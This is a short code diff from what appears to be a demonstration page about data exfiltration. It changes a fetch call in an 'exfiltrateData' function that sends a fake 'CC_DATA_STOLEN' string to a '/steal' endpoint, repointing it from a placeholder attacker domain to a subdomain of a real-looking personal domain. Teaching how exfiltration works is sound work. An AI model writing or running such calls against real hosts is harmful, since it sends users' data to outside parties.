@@ -31,7 +31,7 @@
         function exfiltrateData() {
             const secretData = "CC_DATA_STOLEN";
             // In a real attack, this would be a hidden fetch to a hacker's domain
-            fetch('https://evil-hacker-domain.com/steal?data=' + secretData)
+            fetch('https://evil-hacker.andywright.us/steal?data=' + secretData)
                 .then(() => {
                     monitor.innerHTML = "⚠️ ATTACK SUCCESSFUL: Data sent to evil-hacker-domain.com";
                     monitor.className = "vulnerable";
